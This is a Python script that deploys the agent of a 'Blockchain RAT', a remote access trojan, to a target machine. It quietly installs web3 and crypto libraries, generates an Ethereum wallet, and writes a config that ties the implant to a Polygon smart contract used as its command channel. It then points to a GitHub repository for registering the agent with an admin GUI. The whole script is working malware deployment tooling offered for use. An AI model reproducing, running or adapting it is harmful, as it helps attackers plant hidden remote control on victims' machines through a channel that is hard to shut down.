#!/usr/bin/env python3
"""
Simple Agent Deployment Script
Deploys agent to target machine with auto-configuration
"""

import os
import sys
import json
import subprocess
import shutil
from pathlib import Path

print("=" * 70)
print("BLOCKCHAIN RAT - AGENT DEPLOYMENT")
print("=" * 70)
print()

# Configuration
CONTRACT_ADDRESS = "0x5031fB08D66ea1181eaE1d89f6E960a4f26c3280"
RPC_URL = "https://polygon-rpc.com"

# Step 1: Install dependencies
print("[1/5] Installing dependencies...")
try:
    subprocess.check_call(
        [sys.executable, '-m', 'pip', 'install', '--quiet', '--upgrade',
         'web3>=6.0', 'eth-account>=0.8', 'cryptography>=40.0', 'pycryptodome>=3.15'],
        stdout=subprocess.DEVNULL
    )
    print("  ✓ Dependencies installed")
except Exception as e:
    print(f"  ! Installation warning: {e}")
    print("  Continuing anyway...")

# Step 2: Import modules
print("\n[2/5] Importing modules...")
try:
    from web3 import Web3
    from eth_account import Account
    print("  ✓ Modules loaded")
except ImportError as e:
    print(f"  ✗ Import failed: {e}")
    print("  Please install manually: pip install web3 eth-account cryptography pycryptodome")
    sys.exit(1)

# Step 3: Generate wallet
print("\n[3/5] Generating agent wallet...")
agent_account = Account.create()
agent_address = agent_account.address
agent_key = agent_account.key.hex()

print(f"  ✓ Agent Address: {agent_address}")
print(f"  ✓ Private Key: {agent_key[:10]}...")

# Step 4: Create configuration
print("\n[4/5] Creating configuration...")

config = {
    "rpc_url": RPC_URL,
    "contract_address": CONTRACT_ADDRESS,
    "private_key": agent_key,
    "poll_interval": 10
}

config_file = Path("agent_config.json")
with open(config_file, 'w') as f:
    json.dump(config, f, indent=2)

print(f"  ✓ Config saved: {config_file}")

# Step 5: Download agent files
print("\n[5/5] Setting up agent...")

# Check if we're in the repo
repo_root = Path(__file__).parent.parent
agent_dir = repo_root / "agent"
shared_dir = repo_root / "shared"

if agent_dir.exists() and shared_dir.exists():
    print("  ✓ Agent files found")
    print()
    print("=" * 70)
    print("DEPLOYMENT COMPLETE!")
    print("=" * 70)
    print()
    print(f"Agent Address: {agent_address}")
    print()
    print("IMPORTANT: Send 0.01 MATIC to agent address for gas!")
    print(f"  {agent_address}")
    print()
    print("Then register the agent:")
    print(f"  python {agent_dir}/agent.py --register --config agent_config.json")
    print()
    print("The admin GUI will auto-detect and create a session.")
    print("Then start the agent with the session ID shown in the GUI popup.")
    print()
else:
    print("  ! Agent files not found in repo")
    print()
    print("=" * 70)
    print("MANUAL SETUP REQUIRED")
    print("=" * 70)
    print()
    print("1. Clone the repository:")
    print("   git clone https://github.com/workspacehome0/blockchain_rat.git")
    print()
    print("2. Copy agent and shared folders to this directory")
    print()
    print("3. Run registration:")
    print("   python agent/agent.py --register --config agent_config.json")
    print()
    print(f"Agent Address: {agent_address}")
    print(f"Config File: {config_file.absolute()}")
    print()

